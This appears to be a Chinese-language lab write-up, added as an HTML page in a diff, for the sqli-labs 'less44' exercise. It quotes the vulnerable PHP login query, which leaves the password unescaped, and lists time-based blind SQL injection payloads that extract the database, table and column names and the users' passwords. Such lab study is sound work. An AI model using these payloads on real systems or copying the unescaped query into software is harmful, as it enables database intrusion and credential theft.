@@ -1,0 +1,18 @@
+<hr>
+<h2 id="title-less44url-https-www-yuque-com-u29002979-ep2zrx-age78kwqzq34ywiw"><a href="#title-less44url-https-www-yuque-com-u29002979-ep2zrx-age78kwqzq34ywiw" class="headerlink" title="title: less44url: https://www.yuque.com/u29002979/ep2zrx/age78kwqzq34ywiw"></a>title: less44<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/age78kwqzq34ywiw">https://www.yuque.com/u29002979/ep2zrx/age78kwqzq34ywiw</a></h2><pre><code class="bash">$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);
+$password = $_POST[&quot;login_password&quot;];
+
+$sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;
+if (@mysqli_multi_query($con1, $sql))
+</code></pre>
+<p>测试发现没有了报错回显，那就只能借助盲注的方式进行注入了</p>
+<p><a name="Ehstz"></a></p>
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p><a name="jCJOl"></a></p>
+<h2 id="拆解数据库名称长度"><a href="#拆解数据库名称长度" class="headerlink" title="拆解数据库名称长度"></a>拆解数据库名称长度</h2><p><code>-1&#39; or if(length(database())=8,sleep(5),0)#</code> <a name="kObnI"></a></p>
+<h2 id="猜解数据库名称"><a href="#猜解数据库名称" class="headerlink" title="猜解数据库名称"></a>猜解数据库名称</h2><p><code>-1&#39; or if(ascii(mid(database(),1,1))&lt;=135,sleep(5),0)--+</code> <a name="bZUJF"></a></p>
+<h2 id="猜解数据表名称长度"><a href="#猜解数据表名称长度" class="headerlink" title="猜解数据表名称长度"></a>猜解数据表名称长度</h2><p><code>-1&#39; or if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(5),0)#</code> <a name="kSZVm"></a></p>
+<h2 id="猜解数据表名称"><a href="#猜解数据表名称" class="headerlink" title="猜解数据表名称"></a>猜解数据表名称</h2><p><code>-1&#39; or if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)=&#39;e&#39;,sleep(5),0)--+</code></p>
+<p><a name="j47RV"></a></p>
+<h2 id="猜解字段名称长度"><a href="#猜解字段名称长度" class="headerlink" title="猜解字段名称长度"></a>猜解字段名称长度</h2><p><code>-1&#39; or if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))=20,sleep(5),0)#</code> <a name="qszZ6"></a></p>
+<h2 id="猜解字段名称"><a href="#猜解字段名称" class="headerlink" title="猜解字段名称"></a>猜解字段名称</h2><p><code>-1&#39; or if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1)=&#39;i&#39;,sleep(5),0)--+</code> <a name="aRdmK"></a></p>
+<h2 id="猜解字段内容"><a href="#猜解字段内容" class="headerlink" title="猜解字段内容"></a>猜解字段内容</h2><p><code>-1&#39; or if(mid((select group_concat(username,0x7e,password) from users),1,1)=&#39;D&#39;,sleep(5),0)--+</code></p>
